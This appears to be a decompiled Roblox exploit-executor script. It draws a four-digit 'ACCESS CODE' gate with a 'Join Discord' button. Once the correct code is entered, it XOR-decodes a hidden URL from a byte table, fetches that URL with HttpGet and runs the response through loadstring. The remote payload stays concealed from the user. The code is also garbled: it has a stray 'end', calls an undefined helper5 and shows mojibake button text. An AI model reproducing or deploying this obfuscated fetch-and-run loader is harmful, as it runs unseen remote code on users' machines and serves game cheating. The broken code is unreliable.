local object = game

local function safeCall(val)
  local val2, success = pcall(function() return object:GetService(val) end)

  if val2 and success then
    return cloneref and cloneref(success) or success
  end

  return nil
end

local players = safeCall("Players")
safeCall("TweenService")
local userInputService = safeCall("UserInputService")
local coreGui = safeCall("CoreGui")
local val3 = 2275784684

local function helper(val4)
  if type(val4) ~= "string" or #val4 ~= 4 then
    return false
  else
    local val5 = 2050956445
    local count = 0

    while true do
      count = 1 + count

      if not (4 >= count) then
        break
      end

      local byte = val4:byte(count)

      if not byte then
        return false
      end

      val5 = (val5 * 33 + byte) % 4294967296
    end

    return val5 == val3
  end
end

local function helper2()
  local text = ""
  local randomVal = math.random(15, 27)
  local count2 = 0

  while true do
    count2 = 1 + count2

    if not (randomVal >= count2) then
      break
    end

    text = text .. string.char(math.random(1, 250))
  end

  return text
end

local function helper3(val6, val7)
  local floorVal = val7
  local floorVal2 = val6

  if bit32 and bit32.bxor then
    return bit32.bxor(floorVal2, floorVal)
  end

  if bit and bit.bxor then
    return bit.bxor(floorVal2, floorVal)
  else
    local total = 0
    local val8 = 1

    while floorVal2 > 0 or floorVal > 0 do
      if floorVal2 % 2 ~= floorVal % 2 then
        total = total + val8
      end

      floorVal2 = math.floor(floorVal2 / 2)
      floorVal = math.floor(floorVal / 2)
      val8 = val8 * 2
    end

    return total
  end
end

local val9 = {
  80, 71, 70, 66, 75, 9, 29, 29, 95, 90, 65, 70, 22, 84, 91, 70, 80, 70, 80, 71, 75, 86, 64, 81, 87, 93, 70, 87, 86, 71, 28, 81, 87, 94, 29, 124, 93, 75, 70, 117, 93, 93, 124, 71, 23, 81, 84, 10, 9, 85, 86, 11, 14, 1, 3, 83, 1, 82, 80, 3, 11, 5, 3, 3, 12, 82, 2, 7, 94, 7, 6, 1, 93, 3, 2, 1, 10, 28, 64, 83, 79, 28, 85, 91, 75, 71, 84, 91, 84, 86, 3, 28, 76, 75, 70, }

local function helper4(val10)
  if type(val10) ~= "string" or #val10 == 0 then
    return ""
  else
    local val11 = {}
    local val12 = #val10

    for i = 1, #val9 do
      local byte2 = val10:byte((i - 1) % val12 + 1)
      val11[i] = string.char(helper3(val9[i], byte2))
    end

    return table.concat(val11)
  end
end

local val13 = {
  bg = Color3.fromRGB(22, 22, 30), digitBg = Color3.fromRGB(36, 36, 54), border = Color3.fromRGB(58, 58, 80), accent = Color3.fromRGB(0, 200, 83), text = Color3.fromRGB(150, 150, 170), white = Color3.fromRGB(255, 255, 255), success = Color3.fromRGB(0, 210, 90), failure = Color3.fromRGB(215, 50, 50), discord = Color3.fromRGB(88, 101, 242), discordH = Color3.fromRGB(71, 82, 200), }

local tweenInfo = TweenInfo.new(0.16, Enum.EasingStyle.Quad)
local tweenInfo2 = TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
local val14
pcall(function() val14 = gethui and gethui() or coreGui end)

if not val14 then
  pcall(function()
    val14 = coreGui
      or players and players.LocalPlayer
        and players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
  end)
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = helper2()
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true

end

screenGui.Parent = val14

local function createUICorner(parent, val15)
  local uiCorner = Instance.new("UICorner")
  uiCorner.Name = helper2()
  uiCorner.CornerRadius = UDim.new(0, val15 or 8)
  uiCorner.Parent = parent
end

local function createUIStroke(parent2, val16, val17)
  local uiStroke = Instance.new("UIStroke")
  uiStroke.Name = helper2()
  uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  uiStroke.Color = val16 or val13.border
  uiStroke.Thickness = val17 or 1.5
  uiStroke.Transparency = 1
  uiStroke.Parent = parent2

  return uiStroke
end

local frame = Instance.new("Frame")
frame.Name = helper2()
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Size = UDim2.new(0, 420, 0, 176)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = val13.bg
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 1
frame.Parent = screenGui

createUICorner(frame, 14)
local val18 = createUIStroke(frame, Color3.fromRGB(40, 40, 60), 1.5)

local uiScale = Instance.new("UIScale")
uiScale.Name = helper2()
uiScale.Scale = 0.82
uiScale.Parent = frame

local frame2 = Instance.new("Frame")
frame2.Name = helper2()
frame2.Size = UDim2.new(0, 100, 0, 3)
frame2.Position = UDim2.new(0.5, -50, 0, 0)
frame2.BackgroundColor3 = val13.accent
frame2.BorderSizePixel = 0
frame2.BackgroundTransparency = 1
frame2.Parent = frame

createUICorner(frame2, 2)

local textLabel = Instance.new("TextLabel")
textLabel.Name = helper2()
textLabel.Size = UDim2.new(1, 0, 0, 24)
textLabel.Position = UDim2.new(0, 0, 0, 12)
textLabel.BackgroundTransparency = 1
textLabel.Text = "ACCESS CODE"
textLabel.TextColor3 = val13.white
textLabel.TextSize = 15
textLabel.Font = Enum.Font.GothamBold
textLabel.TextTransparency = 1
textLabel.Parent = frame

local textLabel2 = Instance.new("TextLabel")
textLabel2.Name = helper2()
textLabel2.Size = UDim2.new(1, 0, 0, 15)
textLabel2.Position = UDim2.new(0, 0, 0, 38)
textLabel2.BackgroundTransparency = 1
textLabel2.Text = "Permanent code in Discord"
textLabel2.TextColor3 = val13.text
textLabel2.TextSize = 13
textLabel2.Font = Enum.Font.Gotham
textLabel2.TextTransparency = 1
textLabel2.Parent = frame

local val19 = {}
local val20 = { "", "", "", "" }
local val21 = 0
local val22 = false

for j = 1, 4 do
  local frame3 = Instance.new("Frame")
  frame3.Name = helper2()
  frame3.Size = UDim2.new(0, 64, 0, 68)
  frame3.Position = UDim2.new(0, 64 + (j - 1) * 76, 0, 60)
  frame3.BackgroundColor3 = val13.digitBg
  frame3.BorderSizePixel = 0
  frame3.BackgroundTransparency = 1
  frame3.Parent = frame

  createUICorner(frame3, 12)
  local sk = createUIStroke(frame3, val13.border, 1.5)

  local textLabel3 = Instance.new("TextLabel")
  textLabel3.Name = helper2()
  textLabel3.Size = UDim2.new(1, 0, 1, 0)
  textLabel3.BackgroundTransparency = 1
  textLabel3.Text = "â"
  textLabel3.TextColor3 = Color3.fromRGB(52, 52, 72)
  textLabel3.TextSize = 16
  textLabel3.Font = Enum.Font.GothamBold
  textLabel3.TextTransparency = 1
  textLabel3.Parent = frame3

  local textLabel4 = Instance.new("TextLabel")
  textLabel4.Name = helper2()
  textLabel4.Size = UDim2.new(1, 0, 1, 0)
  textLabel4.BackgroundTransparency = 1
  textLabel4.Text = ""
  textLabel4.TextColor3 = val13.white
  textLabel4.TextSize = 32
  textLabel4.Font = Enum.Font.GothamBold
  textLabel4.TextTransparency = 1
  textLabel4.Parent = frame3

  val19[j] = {
    frame = frame3, lbl = textLabel4, dash = textLabel3, sk = sk, }
end

local textButton = Instance.new("TextButton")
textButton.Name = helper2()
textButton.Size = UDim2.new(0, 148, 0, 30)
textButton.Position = UDim2.new(0.5, -74, 0, 136)
textButton.BackgroundColor3 = val13.discord
textButton.BorderSizePixel = 0
textButton.Text = "â  Join Discord"
textButton.TextColor3 = val13.white
textButton.TextSize = 12
textButton.Font = Enum.Font.GothamBold
textButton.BackgroundTransparency = 1
textButton.TextTransparency = 1
textButton.Parent = frame

createUICorner(textButton, 7)
local val23 = false

textButton.MouseEnter:Connect(function()
  if val23 then
    return
  end

  helper5(textButton, tweenInfo, { BackgroundColor3 = val13.discordH })
end)

textButton.MouseLeave:Connect(function()
  if val23 then
    return
  end

  helper5(textButton, tweenInfo, { BackgroundColor3 = val13.discord })
end)

textButton.MouseButton1Click:Connect(function()
  if val23 then
    return
  end

  val23 = true
  local tweenInfo3 = TweenInfo.new(0.18, Enum.EasingStyle.Quad)
  helper5(textButton, tweenInfo3, { BackgroundColor3 = val13.success })
  textButton.Text = "â  Link copied!"

  task.delay(1.6, function()
    helper5(textButton, tweenInfo3, { BackgroundColor3 = val13.discord })
    textButton.Text = "â  Join Discord"
    val23 = false
  end)
end)

local val24 = {}

for k = 1, 4 do
  local textBox = Instance.new("TextBox")
  textBox.Name = helper2()
  textBox.Size = UDim2.new(1, 0, 1, 0)
  textBox.BackgroundTransparency = 1
  textBox.TextTransparency = 1
  textBox.Text = ""
  textBox.ClearTextOnFocus = true
  textBox.PlaceholderText = ""
  textBox.Font = Enum.Font.GothamBold
  textBox.TextSize = 32
  textBox.Parent = val19[k].frame

  val24[k] = textBox
end

local function helper6(val25, val26)
  val20[val25] = val26
  val19[val25].lbl.Text = val26
  helper5(val19[val25].dash, tweenInfo, { TextTransparency = val26 ~= "" and 1 or 0 })
end

local val27 = {}

for m = 1, 4 do
  val27[m] = false
end

local function helper7()
  local count3 = 0

  while true do
    count3 = 1 + count3

    if not (4 >= count3) then
      break
    end

    local val28 = count3
    val27[val28] = true
    val24[val28].Text = ""
    val27[val28] = false
    val20[val28] = ""

    local element = val19[val28]
    element.lbl.Text = ""

    local tweenInfo4 = TweenInfo.new(0.18, Enum.EasingStyle.Quad)

    helper5(element.frame, tweenInfo4, { BackgroundColor3 = val13.digitBg })
    helper5(element.sk, tweenInfo4, { Color = val13.border, Transparency = 0.45 })
    helper5(element.lbl, tweenInfo4, { TextColor3 = val13.white })
    helper5(element.dash, tweenInfo4, { TextTransparency = 0 })
  end
end

local udim = UDim2.new(0.5, 0, 0.5, 0)
local connect, helper8

local function helper9(val29, val30)
  val22 = true

  for n = 1, 4 do
    val24[n]:ReleaseFocus()
  end

  TweenInfo.new(0.14, Enum.EasingStyle.Quad)

  if val29 then
    task.delay(0.8, function()
      local tweenInfo5 = TweenInfo.new(0.4, Enum.EasingStyle.Quad)

      helper5(uiScale, tweenInfo5, { Scale = 0.88 })
      helper5(frame, tweenInfo5, { BackgroundTransparency = 1 })
      helper5(val18, tweenInfo5, { Transparency = 1 })
      helper5(frame2, tweenInfo5, { BackgroundTransparency = 1 })
      helper5(textLabel, tweenInfo5, { TextTransparency = 1 })
      helper5(textLabel2, tweenInfo5, { TextTransparency = 1 })
      helper5(textButton, tweenInfo5, { BackgroundTransparency = 1, TextTransparency = 1 })

      for i6 = 1, 4 do
        local element2 = val19[i6]

        helper5(element2.frame, tweenInfo5, { BackgroundTransparency = 1 })
        helper5(element2.sk, tweenInfo5, { Transparency = 1 })
        helper5(element2.lbl, tweenInfo5, { TextTransparency = 1 })
        helper5(element2.dash, tweenInfo5, { TextTransparency = 1 })
      end

      task.delay(0.45, function()
        if connect then
          pcall(function() connect:Disconnect() end)
          connect = nil
        end

        pcall(function() screenGui:Destroy() end)

        pcall(function()
          local val31 = helper4(val30)
          local val32, httpResponse = pcall(function() return object:HttpGet(val31) end)

          if val32 and httpResponse and #httpResponse > 0 then
            local val33, success2 = pcall(loadstring, httpResponse)

            if val33 and type(success2) == "function" then
              task.spawn(success2)
            end
          end
        end)
      end)
    end)
  else
    helper8()

    task.delay(0.55, function()
      helper7()

      task.delay(0.22, function()
        val22 = false
        val21 = 0

        if val24[1] then
          val24[1]:CaptureFocus()
        end
      end)
    end)
  end
end

function helper8()
  helper5(frame, TweenInfo.new(0.07, Enum.EasingStyle.Quad), {
    Position = UDim2.new(0.5, 10, 0.5, 0), })

  task.delay(0.07, function()
    helper5(frame, TweenInfo.new(0.07), { Position = UDim2.new(0.5, -10, 0.5, 0) })
  end)

  task.delay(0.14, function()
    helper5(frame, TweenInfo.new(0.07), { Position = UDim2.new(0.5, 5, 0.5, 0) })
  end)

  task.delay(0.21000000000000002, function()
    helper5(frame, TweenInfo.new(0.07), { Position = udim })
  end)
end

local count4 = 0

while true do
  count4 = 1 + count4

  if not (4 >= count4) then
    break
  end

  local val34 = count4
  local element3 = val24[val34]
  local element4 = val19[val34]

  element3.Focused:Connect(function()
    val21 = val34

    if val22 then
      return
    end

    helper5(element4.frame, tweenInfo, { BackgroundColor3 = Color3.fromRGB(26, 44, 34) })
    helper5(element4.sk, tweenInfo, { Color = val13.accent, Transparency = 0 })
  end)

  element3.FocusLost:Connect(function()
    if val22 then
      return
    end

    helper5(element4.frame, tweenInfo, { BackgroundColor3 = val13.digitBg })
    helper5(element4.sk, tweenInfo, { Color = val13.border, Transparency = val20[val34] ~= "" and 0 or 0.45 })
  end)

  element3:GetPropertyChangedSignal("Text"):Connect(function()
    local val35 = val27[val34] or val22
    local val36

    if val35 then
      return
    else
      local gsub = element3.Text:gsub("[^%d]", "")

      if #gsub > 1 then
        val27[val34] = true
        element3.Text = ""
        val27[val34] = false
        local val37 = val34

        for match in gsub:gmatch("%d") do
          if val37 <= 4 then
            val27[val37] = true
            val24[val37].Text = match
            val27[val37] = false
            helper6(val37, match)
            val37 = val37 + 1
          end
        end

        if val37 > 4 then
          val36 = table.concat(val20)

          if #val36 == 4 and not val22 then
            task.defer(function() helper9(helper(val36), val36) end)
          end
        elseif val37 <= 4 and val24[val37] then
          val24[val37]:CaptureFocus()
        end

        return
      end

      val27[val34] = true
      element3.Text = gsub
      val27[val34] = false
      helper6(val34, gsub)

      if gsub ~= "" then
        task.defer(function()
          if val34 < 4 then
            val24[val34 + 1]:CaptureFocus()
          else
            local val38 = table.concat(val20)

            if #val38 == 4 and not val22 then
              helper9(helper(val38), val38)
            end
          end
        end)
      end

      return
    end
  end)
end

connect = userInputService.InputBegan:Connect(function(input, p16)
  if input.KeyCode ~= Enum.KeyCode.Backspace then
    return
  end

  if val22 or val21 < 2 then
    return
  else
    local val39 = false

    for index, value in ipairs(val24) do
      if value:IsFocused() then
        val39 = true
        break
      end
    end

    if not val39 then
      return
    end

    if val20[val21] == "" and val24[val21 - 1] then
      val24[val21 - 1]:CaptureFocus()
    end

    return
  end
end)

local function helper10()
  helper5(uiScale, tweenInfo2, { Scale = 1 })
  helper5(frame, TweenInfo.new(0.28, Enum.EasingStyle.Quad), { BackgroundTransparency = 0 })
  helper5(val18, TweenInfo.new(0.28, Enum.EasingStyle.Quad), { Transparency = 0 })

  task.delay(0.1, function()
    local tweenInfo6 = TweenInfo.new(0.25, Enum.EasingStyle.Quad)

    helper5(frame2, tweenInfo6, { BackgroundTransparency = 0 })
    helper5(textLabel, tweenInfo6, { TextTransparency = 0 })
    helper5(textLabel2, tweenInfo6, { TextTransparency = 0 })

    local count5 = 0

    while true do
      count5 = 1 + count5

      if not (count5 <= 4) then
        break
      end

      local val40 = count5

      task.delay((val40 - 1) * 0.06, function()
        local element5 = val19[val40]

        helper5(element5.frame, tweenInfo6, { BackgroundTransparency = 0 })
        helper5(element5.dash, tweenInfo6, { TextTransparency = 0 })
        helper5(element5.sk, tweenInfo6, { Transparency = 0.45 })
        helper5(element5.lbl, tweenInfo6, { TextTransparency = 0 })
      end)
    end

    task.delay(0.32, function()
      helper5(textButton, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0, TextTransparency = 0, })
    end)
  end)
end

helper10()

task.delay(0.6, function()
  if val24[1] then
    val24[1]:CaptureFocus()
  end
end)
